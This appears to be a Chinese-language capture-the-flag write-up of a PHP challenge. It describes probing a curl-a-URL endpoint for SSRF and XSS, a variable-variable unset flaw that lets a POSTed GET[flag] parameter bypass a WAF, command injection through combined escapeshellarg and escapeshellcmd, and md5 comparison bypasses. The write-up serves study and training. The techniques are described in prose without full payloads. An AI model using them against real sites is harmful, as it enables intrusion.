day2-filter_var函数缺陷

黑盒测试

访问靶场，提示curl一个网站，get方式提交参数url，想着这个地方其实可能存在SSRF，或者是XSS，因为一般的思路就是url传参的地方会有这些漏洞可以。

但是测试后发现他只能curl sec-redclub.com，其他的不行，本来想到xss，于是试着把http改为JavaScript，因为这个可以绕过一些过滤，而且猜测这个url传入后端后会有过滤，比如根据”://“这个来判断是不是url，过滤掉一般的xss的payload，发现写javascript和写http没有区别，于是看看xss的payload能不能执行，发现执行不了。于是只能换思路，想着curl这个应该是系统的命令，想着会不会可以利用这个来执行SSRF，结果想起只能curl sec-redclub.com。于是没有思路了，只能上机白盒审计了。

preg_match() 是 PHP 中用于进行正则表达式匹配的函数之一。它用于检查一个字符串是否与给定的正则表达式模式匹配。

这个函数的基本语法是：

preg_match(pattern, subject, matches);

  • pattern 是你想要匹配的正则表达式模式。

  • subject 是待检查的字符串。

  • matches 是一个可选参数，用于存储匹配到的结果。

    第二部分就是一个unset的函数，在运行这个代码的时候会一开始就直接根据POST，GET，COOKIE方式进行遍历清理提交的重复的参数。只要有重复的值，就会释放该变量的内存。

    根据github提供的思路，发现有一些不理解的地方，想看代码的实际运行数值，利用docker搭建了php+xdebug的环境，利用本地文件进行调试。

    post传入GET[] ,在第一个处理函数时，由于 $$ 的引用不恰当，导致在直接处理POST时直接将GET变量销毁，当我post方式传递GET[flag]=1,同时GET方式传入flag=1，unset函数被触发，他销毁了_GET参数，使得get传递的参数在遍历完POST后跳过遍历GET，且get传递进去的参数flag绕过了waf函数的检测。

escapeshellarg 和 escapeshellcmd 是 PHP 中用于处理 shell 命令的安全函数。前者转义参数，后者转义命令，但是他们在配合的时候，可能导致单引号配对错误，可以用来恶意构造payload进行命令注入。

  • **escapeshellarg**：用于转义字符串以在 shell 命令中使用，将字符串作为参数传递给 shell 命令时使用。将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。
  • **escapeshellcmd*：用于转义命令字符串，确保命令字符串在 shell 中的执行不会受到非预期的影响。以下字符前面有一个反斜杠：&#;`|?~<>^()[]{}$\，\x0A和\xFF。’和“只有在未配对的情况下才会被转义。在Windows上，所有这些字符加上%和!都会被空格代替。

可以看到传入的参数在命令行的时候发生了变化，可以利用这个进行攻击。回到靶场，我们要先绕过md5对比，并且利用escapeshell来进行注入攻击。

而对于md5的绕过，在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，结果均为0，因此在比较两个以 0e开头的字符串时，无论后面的字符时是什么，比较结果都为 True。常见的

在 php 中，代表着强比较，不仅仅会比较值，还会比较类型。因此这里不能在使用上面的方式进行绕过了。要绕过的比较，需要向 md5() 函数中传入数组，md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为 True 绕过。

如果前面都不行，只能尝试md5碰撞，MD5 值计算方法本身的缺陷 —— 存在散列冲突，必然会有两个内容一样但是 MD5 值一样的序列。

当我在试图直接在我电脑使用curl时发现payload没有正确执行。应该是命令行环境和php的system执行函数是有区别的。
